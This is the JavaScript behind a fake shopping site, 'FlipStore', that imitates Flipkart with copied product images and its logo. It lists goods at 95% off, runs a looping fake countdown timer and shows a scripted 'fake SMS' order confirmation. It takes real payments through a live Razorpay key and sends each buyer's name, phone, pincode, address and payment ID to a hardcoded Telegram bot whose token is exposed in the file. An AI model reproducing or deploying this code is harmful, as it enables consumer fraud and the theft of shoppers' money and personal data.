console.log("FlipStore Script Loaded Successfully! v2.0"); // Debugging Line

// --- CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
const TELEGRAM_CHAT_ID = "1815847082"; 

// --- RAZORPAY CONFIGURATION ---
const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 

// --- UPI CONFIGURATION ---
const UPI_ID = "gpay-11265399414@okbizaxis"; 
const MERCHANT_NAME = "VR Shop";
const MERCHANT_CODE = "BCR2DN5TWTE6VMRU";

const products = [
    // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
    { 
        id: 1,
        category: "Earbuds",
        name: "Aroma NB121 Pods",
        fullName: "Aroma NB121 Pods Upto 40 Hours Playtime Type C Fast Charging",
        price: 2999, 
        rating: 4.1, reviews: "12,403",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/u/0/nb121-pods-upto-40-hours-playtime-type-c-fast-charging-dual-original-imahh4a72k7jbk2h.jpeg?q=70&amp;crop=false"
    },
    { 
        id: 2, 
        category: "Earbuds", 
        name: "GOBOULT Z40", 
        fullName: "GOBOULT Z40 with ENC Mic, 60Hr Battery, Metal Finish", 
        price: 3499, 
        rating: 4.3, reviews: "8,500",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/a/c/-original-imahebzzqs5fspcv.jpeg?q=70&crop=false" 
    },
    {
        id: 3,
        category: "Earbuds",
        name: "OnePlus Nord Buds 3r", 
        fullName: "OnePlus Nord Buds 3r TWS Earbuds, 3D Audio, 2-mic call (Blue)", 
        price: 2299, 
        rating: 4.5, reviews: "34,201",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70&crop=false" 
    },
    { 
        id: 4, 
        category: "Earbuds", 
        name: "Mivi Duopods B1", 
        fullName: "Mivi Duopods B1 (Just Launched) 45 Hours Playtime", 
        price: 1999, 
        rating: 4.0, reviews: "2,100",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/k/r/-original-imaha9pgxwpfewtb.jpeg?q=70&crop=false" 
    },
    { 
        id: 5, 
        category: "Earbuds", 
        name: "truke Buds Lite", 
        fullName: "truke Buds Lite with 60 Hours Playtime, Deep Bass", 
        price: 1599, 
        rating: 3.9, reviews: "5,640",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/f/d/-original-imahgbn7hzywq3gm.jpeg?q=70&crop=false" 
    },
    { 
        id: 6, 
        category: "Earbuds", 
        name: "OnePlus Nord Buds 3r", 
        fullName: "OnePlus Nord Buds 3r TWS Earbuds, Ash Black", 
        price: 2299,
        rating: 4.6, reviews: "31,090", 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70&crop=false" 
    },
    
    // --- Sunglasses ---
    { 
        id: 7, 
        category: "Sunglasses", 
        name: "UV Wayfarer", 
        fullName: "UV Protection Wayfarer Sunglasses (Free Size) (Black)", 
        price: 999,
        rating: 4.2, reviews: "1,200", 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/v/9/p/free-size-com179-13-dervin-original-imahya4ekrznrmfb.jpeg?q=70&crop=false" 
    },
    { 
        id: 8, 
        category: "Sunglasses", 
        name: "Retro Square", 
        fullName: "UV Protection Retro Square Round Sunglasses (Black)", 
        price: 1299, 
        rating: 4.1, reviews: "850",
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/h/l/p/free-dd-29a-bollywood-stylish-dkeraod-original-imahgq34aswzc2mq.jpeg?q=70&crop=false" 
    },
    { 
        id: 9, 
        category: "Sunglasses", 
        name: "Riding Glasses", 
        fullName: "UV Protection Riding Glasses, Rectangle Sunglasses", 
        price: 799, 
        rating: 3.8, reviews: "2,300",
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/t/n/c/medium-goldrimless-spectaswag-original-imahfvfmmbjpfzkz.jpeg?q=70&crop=false" 
    },
    { 
        id: 10, 
        category: "Sunglasses", 
        name: "Sport Wrap", 
        fullName: "UV Protection Wrap-Around Sports Sunglasses (Multicolor)", 
        price: 1499,
        rating: 4.4, reviews: "900", 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/2/p/o/medium-polarized-uv-protection-cycling-running-sports-unisex-original-imah9uezabpvc8gx.jpeg?q=70&crop=false" 
    },
    { 
        id: 11, 
        category: "Sunglasses", 
        name: "Polarized Round", 
        fullName: "UV Protection Gradient Polarized Round Sunglasses (Black)", 
        price: 1999, 
        rating: 4.3, reviews: "15,400",
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/r/y/r/medium-pathan-sunglass-19r-rozti-original-imah2zgqxdgycugw.jpeg?q=70&crop=false" 
    },

    // --- Smartwatches ---
    { 
        id: 12, 
        category: "Smartwatch", 
        name: "Bolt Drift+", 
        fullName: "Bolt Drift+ 1.85, Bluetooth Calling, 500nits, 150+ Faces (White)", 
        price: 3999, 
        rating: 4.8, reviews: "5,100",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/j/h/o/-original-imahejynzkuaaaty.jpeg?q=70&crop=false" 
    },
    { 
        id: 13, 
        category: "Smartwatch", 
        name: "Samsung Galaxy 7", 
        fullName: "Samsung Galaxy Watch7 44mm LTE Smartwatch (Green Strap)", 
        price: 29999, 
        rating: 4.0, reviews: "1,200",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/e/o/m/-original-imahghmjmftemu54.jpeg?q=70&crop=false" 
    },
    { 
        id: 14, 
        category: "Smartwatch", 
        name: "Teton 1.85", 
        fullName: "Teton 1.85 | Premium Design | Functional Crown | AI Coach (Black)", 
        price: 4500, 
        rating: 4.2, reviews: "8,900",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/t/g/s/-original-imagwezgyvbke6up.jpeg?q=70&crop=false" 
    },
    { 
        id: 15, 
        category: "Smartwatch", 
        name: "Fastrack Revoltt", 
        fullName: "Fastrack Revoltt FS2Pro - 1.96 Super AMOLED Curved (Black)", 
        price: 5999, 
        rating: 4.1, reviews: "6,700",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/t/a/e/-original-imah4nbwu6xapqdx.jpeg?q=70&crop=false" 
    },
    { 
        id: 16, 
        category: "Smartwatch", 
        name: "Fastrack Radiant", 
        fullName: "Fastrack Radiant FX4 - 1.51 AMOLED | AOD | SS Strap (Gold)", 
        price: 6499, 
        rating: 4.4, reviews: "22,100",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/6/x/i/38-354-38158wm01-android-ios-fastrack-yes-original-imah6wqm5ywzhtbv.jpeg?q=70&crop=false" 
    },

    // --- Headphones/Audio ---
    { 
        id: 17, 
        category: "Headset", 
        name: "Bolt Z40 Pro", 
        fullName: "Bolt Z40 Pro with 100H Battery, Quad Mic ENC, Rubber Grip (Midnight)", 
        price: 2499, 
        rating: 4.5, reviews: "3,400",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70&crop=false" 
    },
    { 
        id: 18, 
        category: "Headset", 
        name: "Realme Buds T200", 
        fullName: "Realme Buds T200 Lite 12.4mm Driver, 48hrs Playback (Black)", 
        price: 1899, 
        rating: 3.9, reviews: "9,800",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/b/h/-original-imaha6btcgqdqy5e.jpeg?q=70&crop=false" 
    },
    { 
        id: 19, 
        category: "Headset", 
        name: "Patron Bassbuds", 
        fullName: "Patron Bassbuds Vibe 34 Hrs Playback, 13mm Drivers (Lilac)", 
        price: 1299, 
        rating: 4.0, reviews: "4,500",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/f/u/m/-original-imah9f97v86bkauj.jpeg?q=70&crop=false" 
    },
    { 
        id: 20, 
        category: "Headset", 
        name: "GoBolt Fluid X Pro", 
        fullName: "GoBolt Fluid X Pro ANC, 70H Battery, Foldable, Gaming Mode (Beige)", 
        price: 3499, 
        rating: 4.1, reviews: "12,300",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/m/t/5/-original-imahf77sttdscszt.jpeg?q=70&crop=false" 
    },
    { 
        id: 21, 
        category: "Headset", 
        name: "GoBolt Fluid X", 
        fullName: "GoBolt Fluid X with 60H Battery, Foldable, ENC Mic (White)", 
        price: 2999, 
        rating: 4.3, reviews: "2,800",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/o/s/-original-imahf77syamgxzfy.jpeg?q=70&crop=false" 
    },
    { 
        id: 22, 
        category: "Headset", 
        name: "Zeb-Thunder Pro", 
        fullName: "Zebronics Zeb-Thunder Pro 60H Backup, BT v5.3, Gaming Mode (Olive)", 
        price: 1599, 
        rating: 4.4, reviews: "3500",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/wireless-headset/z/s/z/zeb-thunder-pro-zebronics-original-imahb2er7evh5fcg.jpeg?q=70&crop=false" 
    },
    { 
        id: 23, 
        category: "Headset", 
        name: "Boat Rockerz 480", 
        fullName: "Boat Rockerz 480 Beast Mode, RGB LEDs, 60 Hrs Playback (Black Sabre)", 
        price: 2299, 
        rating: 3.3, reviews: "1,800",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/t/k/l/-original-imah5h428mq9v8bb.jpeg?q=70&crop=false" 
    },
    { 
        id: 24, 
        category: "Headset", 
        name: "bAot B5 Neckband", 
        fullName: "bAot Wireless Earbuds B5 Neckband 48 Hrs Playback (Black)", 
        price: 999, 
        rating: 4.1, reviews: "2,100",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/x/q/g/wireless-5-bluetooth-neckband-hd-sound-enc-mic-lightweight-original-imahefhdhhuezm6t.jpeg?q=70&crop=false" 
    },
    { 
        id: 25, 
        category: "Headset", 
        name: "Boat Rockerz 202", 
        fullName: "Boat Rockerz 202, 20H Battery, ENx, ASAP Charge (Active Black)", 
        price: 1499, 
        rating: 3.5, reviews: "2,780",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/n/x/-original-imahgxngysekkxv9.jpeg?q=70&crop=false" 
    },
    { 
        id: 26, 
        category: "Wired", 
        name: "Trigger Blaze", 
        fullName: "Trigger Blaze 3.5mm Wired Earphones 13mm Driver, Rich Bass (Orange)", 
        price: 499, 
        rating: 4.2, reviews: "3,709",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/x/u/-original-imahfvt66acj8r7y.jpeg?q=70&crop=false" 
    },
    { 
        id: 27, 
        category: "Wired", 
        name: "JBL C150SI", 
        fullName: "JBL C150SI with One-Button Universal Remote (Black)", 
        price: 899,
        rating: 3.1, reviews: "2,130", 
        image: "https://rukminim2.flixcart.com/image/416/416/kokdci80/headphone/dynamic/h/b/h/c150siublk-jbl-original-imag2zyvwwujwa7t.jpeg?q=70&crop=false" 
    },
    { 
        id: 28, 
        category: "Wired", 
        name: "Spinbot BattleBudz", 
        fullName: "Spinbot BattleBudz C30 Type-C Gaming Earphones (Black, Red)", 
        price: 699, 
        rating: 4.0, reviews: "2,540",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/l/k/h/battlebudz-c30-type-c-gaming-earphones-with-boom-mic-12mm-gaming-original-imahftzfhafyhyky.jpeg?q=70&crop=false" 
    },
    { 
        id: 29, 
        category: "Wired", 
        name: "Portronics Conch", 
        fullName: "Portronics Conch Gama Earphones 1.2m Cable, Aux Port (Black)", 
        price: 399, 
        rating: 4.3, reviews: "2,800",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/v/u/por-1025-gama-portronics-original-imahbnhya6fkhrsy.jpeg?q=70&crop=false" 
    },
    
    // --- Trimmers ---
    { 
        id: 30, 
        category: "Trimmer", 
        name: "Zapkart Trimmer", 
        fullName: "Zapkart Trimmer pack of 1, 45 min Runtime (Black, Silver)", 
        price: 899, 
        rating: 3.5, reviews: "2,780",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/e/0/2/0-5-8-mm-trimmer-packof-1-asfa-87-stainless-steel-corded-original-imahgz3azgshzyec.jpeg?q=70&crop=false" 
    },
    { 
        id: 31, 
        category: "Trimmer", 
        name: "Smartbuy FKSB 10", 
        fullName: "Flipkart Smartbuy FKSB 10, Runtime: 120 min for Men", 
        price: 1199, 
        rating: 3.9, reviews: "1,990",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/k/x/9/0-25-4-mm-fksb-10-titanium-coated-cordless-flipkart-smartbuy-original-imahdzppszx6tx2d.jpeg?q=70&crop=false" 
    },
    { 
        id: 32, 
        category: "Trimmer", 
        name: "Nova NHT 1132", 
        fullName: "Nova NHT 1132, Runtime: 150 min for Men (Black, Red)", 
        price: 1099, 
        rating: 3.9, reviews: "2,156",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/0/6/v/0-5-20-mm-nht-1132-stainless-steel-cordless-nova-original-imahd2hskhxz9uut.jpeg?q=70&crop=false" 
    },
    { 
        id: 33, 
        category: "Trimmer", 
        name: "Smartbuy FKSB 20", 
        fullName: "Flipkart Smartbuy FKSB 20, IPX4, Digital Display, 150 min", 
        price: 1499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/m/f/k/0-25-4-mm-fksb-20-ipx4-digital-display-2-speed-setting-original-imah5dtgkm3bwgyx.jpeg?q=70&crop=false" 
    },
    { 
        id: 34, 
        category: "Trimmer", 
        name: "Bombay Shaving", 
        fullName: "Bombay Shaving Company POWER PLAY NXT BEARD TRIMMER (Green)", 
        price: 1699, 
        rating: 3.8, reviews: "1,289",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/shopsy-trimmer/a/2/k/trimmer-1-20-mm-stainless-steel-power-play-nxt-beard-trimmer-i-original-imahazyzffanxhrw.jpeg?q=70&crop=false" 
    }
];

// --- GLOBAL VARIABLES ---
let currentProduct = null;
let currentPrice = 0;
let cart = []; 
let isCartOrder = false; 

// --- CORE FUNCTIONS ---

function getDiscountedPrice(price) {
    return Math.floor(price * 0.05); 
}

// --- UI UTILS ---
function showToast(message) {
    const box = document.getElementById('toast-box');
    if (!box) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `<i class="fas fa-info-circle" style="color:#2874f0"></i> ${message}`;
    box.appendChild(toast);
    setTimeout(() => { toast.remove(); }, 3000);
}

function showLoading() { 
    const loader = document.getElementById('loading-overlay');
    if(loader) loader.classList.remove('hidden'); 
}
function hideLoading() { 
    const loader = document.getElementById('loading-overlay');
    if(loader) loader.classList.add('hidden'); 
}

// 1. Render Categories
function renderCategories() {
    const nav = document.getElementById('category-nav');
    if (!nav) return;

    const categories = [...new Set(products.map(p => p.category))];
    categories.unshift("All");

    nav.innerHTML = categories.map(cat => {
        const product = products.find(p => p.category === cat) || products[0];
        const img = cat === "All" ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
        
        return `
            <div class="cat-item" onclick="filterByCategory(this, '${cat}')">
                <div class="cat-img-box">
                    <img src="${img}" class="cat-img">
                </div>
                <span class="cat-name">${cat}</span>
            </div>
        `;
    }).join('');
}

// 2. Filter Logic
function filterByCategory(element, category) {
    // UI Update
    document.querySelectorAll('.cat-item').forEach(el => el.classList.remove('active'));
    if(element) element.classList.add('active');

    const title = document.getElementById('section-title');
    if(category === "All") {
        if(title) title.innerText = "Deals of the Day";
        renderProducts(products);
    } else {
        if(title) title.innerText = `Top ${category}`;
        const filtered = products.filter(p => p.category === category);
        renderProducts(filtered);
    }
}

// 3. Render Grid (With Ratings)
function renderProducts(productList = products) {
    const container = document.getElementById('product-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    if(productList.length === 0) {
        container.innerHTML = `
            <div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #666;">
                <p>No products found.</p>
            </div>
        `;
        return;
    }

    productList.forEach(product => {
        const discPrice = getDiscountedPrice(product.price);
        
        const card = document.createElement('div');
        card.className = 'product-card';
        card.innerHTML = `
            <div class="discount-badge">95% OFF</div>
            <img src="${product.image}" class="product-img" loading="lazy">
            <div class="product-title">${product.name}</div>
            
            <div class="product-rating-row">
                <div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div>
                <span class="review-count">(${product.reviews})</span>
            </div>

            <div class="price-box">
                <span class="new-price">₹${discPrice}</span>
                <span class="old-price">₹${product.price}</span>
                <span class="off-percent">95% off</span>
            </div>
        `;
        card.onclick = function() { showProductDetail(product); };
        container.appendChild(card);
    });
}

// 4. Show Detail Page (UPDATED WITH HISTORY PUSH)
function showProductDetail(product) {
    history.pushState({view: 'product'}, '', '#product'); 

    currentProduct = product;
    currentPrice = getDiscountedPrice(product.price);
    isCartOrder = false;

    const homeView = document.getElementById('home-view');
    const detailView = document.getElementById('product-detail-view');
    const timerSection = document.getElementById('timer-section');
    const cartView = document.getElementById('cart-view');

    if(cartView) cartView.style.display = 'none';

    document.getElementById('detail-img').src = product.image;
    document.getElementById('detail-title').innerText = product.fullName;
    document.getElementById('detail-price').innerText = `₹${currentPrice}`;
    document.getElementById('detail-old-price').innerText = `₹${product.price}`;
    
    const badgeStar = document.querySelector('.badge-star');
    if (badgeStar) badgeStar.innerHTML = `${product.rating} <i class="fas fa-star"></i>`;
    
    const reviewCount = document.querySelector('.review-count');
    if (reviewCount) reviewCount.innerText = `${product.reviews} Ratings & Reviews`;

    const addToCartBtn = document.querySelector('.btn-cart');
    if(addToCartBtn) {
        const newBtn = addToCartBtn.cloneNode(true);
        addToCartBtn.parentNode.replaceChild(newBtn, addToCartBtn);
        newBtn.onclick = function() { addToCart(product); };
    }
    
    const buyNowBtn = document.querySelector('.btn-buy');
    if(buyNowBtn) {
        const newBtn = buyNowBtn.cloneNode(true);
        buyNowBtn.parentNode.replaceChild(newBtn, buyNowBtn);
        newBtn.onclick = function() { startCheckout(); };
    }

    const backBtn = document.querySelector('.back-btn');
    if(backBtn) {
        backBtn.onclick = function() { history.back(); };
    }

    if(homeView) homeView.style.display = 'none';
    if(timerSection) timerSection.style.display = 'none';
    
    if(detailView) {
        detailView.classList.remove('hidden');
        detailView.style.display = 'block';
    }

    window.scrollTo({ top: 0, behavior: 'auto' });
}

// 5. Cart Functions
function addToCart(product) {
    cart.push(product);
    showToast(`${product.name} added to cart!`);
    updateCartCount();
}

function updateCartCount() {
    const badge = document.querySelector('.cart-badge');
    if(badge) {
        badge.innerText = cart.length;
        badge.style.display = cart.length > 0 ? 'block' : 'none';
        // Simple animation
        badge.style.transform = 'scale(1.2)';
        setTimeout(() => badge.style.transform = 'scale(1)', 200);
    }
}

function openCart() {
    history.pushState({view: 'cart'}, '', '#cart');

    let cartView = document.getElementById('cart-view');
    if(!cartView) {
        cartView = document.createElement('div');
        cartView.id = 'cart-view';
        cartView.style.cssText = "background: white; padding: 15px; max-width: 1200px; margin: 0 auto; min-height: 80vh;";
        document.querySelector('main').appendChild(cartView);
    }

    document.getElementById('home-view').style.display = 'none';
    document.getElementById('product-detail-view').style.display = 'none';
    document.getElementById('timer-section').style.display = 'none';
    cartView.style.display = 'block';

    if(cart.length === 0) {
        cartView.innerHTML = `
            <div style="text-align:center; padding: 50px;">
                <h3>Cart Empty!</h3>
                <button onclick="history.back()" style="background:#2874f0; color:white; border:none; padding:10px 20px; margin-top:10px;">Shop Now</button>
            </div>
        `;
        return;
    }

    let html = `<h3>My Cart (${cart.length})</h3><div style="display:flex; flex-wrap:wrap; gap:20px;">`;
    let total = 0;
    
    html += `<div style="flex:2; min-width:300px;">`;
    cart.forEach((item, index) => {
        const dPrice = getDiscountedPrice(item.price);
        total += dPrice;
        html += `
            <div style="display:flex; border:1px solid #f0f0f0; padding:10px; margin-bottom:10px;">
                <img src="${item.image}" style="width:60px; height:60px; object-fit:contain; margin-right:10px;">
                <div>
                    <div style="font-size:14px;">${item.name}</div>
                    <div><b>₹${dPrice}</b></div>
                    <button onclick="removeFromCart(${index})" style="border:none; background:none; color:red; cursor:pointer; margin-top:5px;">Remove</button>
                </div>
            </div>
        `;
    });
    html += `</div>`;

    html += `
        <div style="flex:1; min-width:280px;">
            <div style="border:1px solid #f0f0f0; padding:15px;">
                <div style="font-size:18px; font-weight:bold; margin-bottom:10px;">Total: ₹${total}</div>
                <button onclick="initiateCartCheckout(${total})" style="width:100%; background:#fb641b; color:white; border:none; padding:15px; font-weight:bold;">PLACE ORDER</button>
            </div>
        </div>
    </div>`;

    cartView.innerHTML = html;
}

function removeFromCart(index) {
    cart.splice(index, 1);
    updateCartCount();
    openCart();
}

function initiateCartCheckout(totalAmount) {
    isCartOrder = true;
    currentPrice = totalAmount;
    startCheckout();
}

// 6. Go Home (Reset View)
function goHome() {
    const homeView = document.getElementById('home-view');
    const detailView = document.getElementById('product-detail-view');
    const timerSection = document.getElementById('timer-section');
    const cartView = document.getElementById('cart-view');

    if(detailView) {
        detailView.classList.add('hidden');
        detailView.style.display = 'none';
    }
    if(cartView) cartView.style.display = 'none';
    
    if(homeView) homeView.style.display = 'block';
    if(timerSection) timerSection.style.display = 'block';

    // Close modals
    closeModal();
    document.getElementById('successModal').style.display = 'none';

    window.scrollTo({ top: 0, behavior: 'auto' });
}

// 7. Checkout Logic
function startCheckout() {
    const modal = document.getElementById('checkoutModal');
    const stepAddr = document.getElementById('step-address');
    const stepPay = document.getElementById('step-payment');

    stepAddr.classList.remove('hidden');
    stepPay.classList.add('hidden');
    
    document.getElementById('input-name').value = '';
    document.getElementById('input-phone').value = '';
    
    modal.style.display = "flex";
}

function closeModal() {
    document.getElementById('checkoutModal').style.display = "none";
}

// --- TELEGRAM ---
function sendToTelegram(message) {
    if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = { chat_id: TELEGRAM_CHAT_ID, text: message }; // Removed parse_mode markdown to avoid errors

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(console.error);
}

function goToPayment() {
    const name = document.getElementById('input-name').value;
    const phone = document.getElementById('input-phone').value;
    const pincode = document.getElementById('input-pincode').value;
    const addr = document.getElementById('input-addr').value;

    if(!name || !phone || !pincode || !addr) {
        showToast("Please fill all required details");
        return;
    }

    // Capture user details
    window.userDetails = { name, phone, pincode, addr };

    document.getElementById('step-address').classList.add('hidden');
    document.getElementById('step-payment').classList.remove('hidden');
    document.getElementById('payment-total').innerText = `₹${currentPrice}`;
}

function backToAddress() {
    document.getElementById('step-payment').classList.add('hidden');
    document.getElementById('step-address').classList.remove('hidden');
}

// --- HELPER TO LOAD SCRIPT DYNAMICALLY ---
function loadRazorpayScript(src) {
    return new Promise((resolve) => {
        const script = document.createElement("script");
        script.src = src;
        script.onload = () => resolve(true);
        script.onerror = () => resolve(false);
        document.body.appendChild(script);
    });
}

// --- UPDATED RAZORPAY PAYMENT ---
async function processRazorpayPayment() {
    // 1. Check if script is loaded, if not load it
    if (typeof Razorpay === 'undefined') {
        showLoading();
        // Try loading manually if not present
        const res = await loadRazorpayScript("https://checkout.razorpay.com/v1/checkout.js");
        if (!res) {
            hideLoading();
            showToast("Payment Gateway failed to load. Please check internet.");
            return;
        }
    }
    
    showLoading();

    // 2. Setup Options
    var options = {
        "key": RAZORPAY_KEY_ID, 
        "amount": Math.round(currentPrice * 100), // Ensure integer paise
        "currency": "INR",
        "name": "FlipStore",
        "description": isCartOrder ? "Bulk Order" : currentProduct.name,
        "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
        "handler": function (response) {
            hideLoading();
            completeOrder(response.razorpay_payment_id);
        },
        "prefill": {
            "name": window.userDetails.name || "",
            "contact": window.userDetails.phone || ""
        },
        "theme": {
            "color": "#2874f0"
        },
        "modal": {
            "ondismiss": function() {
                hideLoading();
                console.log('Checkout form closed');
            }
        }
    };

    // 3. Open Razorpay
    try {
        var rzp1 = new Razorpay(options);
        rzp1.on('payment.failed', function (response){
            hideLoading();
            alert("Payment Failed: " + response.error.description);
        });
        
        closeModal();
        rzp1.open();
    } catch (e) {
        hideLoading();
        console.error("Razorpay Init Error:", e);
        showToast("Something went wrong with Payment Gateway.");
    }
}

function completeOrder(paymentId) {
    if(isCartOrder) { 
        cart = []; 
        updateCartCount(); 
    }
    
    // 1. Send Telegram Message with Razorpay ID
    let productDetails = isCartOrder ? `BULK ORDER` : `${currentProduct.name}`;
    const orderDetails = `
NEW ORDER CONFIRMED (Razorpay)
-------------------------
Name: ${window.userDetails.name}
Phone: ${window.userDetails.phone}
Pin: ${window.userDetails.pincode}
Address: ${window.userDetails.addr}
-------------------------
Product: ${productDetails}
Amount: ₹${currentPrice}
-------------------------
Payment ID: ${paymentId}
    `;
    sendToTelegram(orderDetails);

    // 2. Show Fake SMS
    let msg = isCartOrder ? "Your bulk order has been successfully placed." : `Order Placed: Your order for ${currentProduct.name} is successful.`;
    showFakeSMSNotification(msg);

    // 3. Show Final Success Screen
    const successModal = document.getElementById('successModal');
    successModal.querySelector('.modal-content').innerHTML = `
        <div style="text-align: center; padding: 20px;">
            <div style="font-size: 50px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div>
            <h2 style="color: #212121;">Order Confirmed!</h2>
            <p style="color: #666; margin-bottom: 20px;">Thank you for shopping with us.</p>
            <p style="font-size: 12px; color: #888;">Transaction ID: ${paymentId}</p>
            <button onclick="closeSuccessAndHome()" style="width: 100%; background: #2874f0; color: white; border: none; padding: 12px; margin-top: 10px; cursor: pointer; border-radius: 2px;">Continue Shopping</button>
        </div>
    `;
    successModal.style.display = 'flex';
}

// --- FAKE SMS ---
function showFakeSMSNotification(msgContent) {
    let notif = document.getElementById('fake-sms-notification');
    if (!notif) {
        notif = document.createElement('div');
        notif.id = 'fake-sms-notification';
        notif.style.cssText = `position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: #fff; padding: 12px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 10000; display: flex; gap: 12px; transition: top 0.5s; border: 1px solid #eee;`;
        document.body.appendChild(notif);
    }
    notif.innerHTML = `<div style="background: #007bff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white;"><i class="fas fa-comment-alt"></i></div><div><div style="font-weight: bold; font-size: 14px;">Messages • Now</div><div style="font-size: 13px;">${msgContent}</div></div>`;
    
    setTimeout(() => { notif.style.top = '20px'; }, 100);
    setTimeout(() => { notif.style.top = '-100px'; }, 6000);
}

function closeSuccessAndHome() {
    document.getElementById('successModal').style.display = 'none';
    goHome();
}

// 8. Timer
function startTimer() {
    const timerElem = document.getElementById('timer');
    if (!timerElem) return;
    setInterval(() => {
        const cycle = 8 * 60;
        const now = Math.floor(Date.now() / 1000);
        const left = cycle - (now % cycle);
        timerElem.innerText = `${Math.floor(left / 60).toString().padStart(2,'0')}:${(left % 60).toString().padStart(2,'0')}`;
    }, 1000);
}

// INITIALIZE
document.addEventListener('DOMContentLoaded', () => {
    // --- MOBILE BACK BUTTON LISTENER ---
    window.addEventListener('popstate', function(event) {
        // When back button is pressed, goHome() restores the home view
        goHome();
    });
    // -----------------------------------

    renderCategories();
    renderProducts();
    startTimer();

    // View All Button
    const viewAllBtn = document.querySelector('.view-all');
    if(viewAllBtn) {
        viewAllBtn.addEventListener('click', () => {
            filterByCategory(null, 'All');
        });
    }

    const cartBtn = document.querySelector('.cart-btn');
    if(cartBtn) cartBtn.addEventListener('click', (e) => { e.preventDefault(); openCart(); });

    const loginBtn = document.querySelector('.login-btn');
    if(loginBtn) loginBtn.addEventListener('click', () => { showToast("You are already logged in!"); goHome(); });

    const sellerBtn = Array.from(document.querySelectorAll('.nav-links a')).find(el => el.innerText.includes('Become a Seller'));
    if(sellerBtn) sellerBtn.addEventListener('click', (e) => { e.preventDefault(); showToast("Aap eligible nahi hai"); });

    // Search
    const searchInput = document.querySelector('.search-bar input');
    if(searchInput) {
        searchInput.addEventListener('input', (e) => {
            const q = e.target.value.toLowerCase().trim();
            if(q === "") return renderProducts(products);
            renderProducts(products.filter(p => p.name.toLowerCase().includes(q)));
        });
    }
});
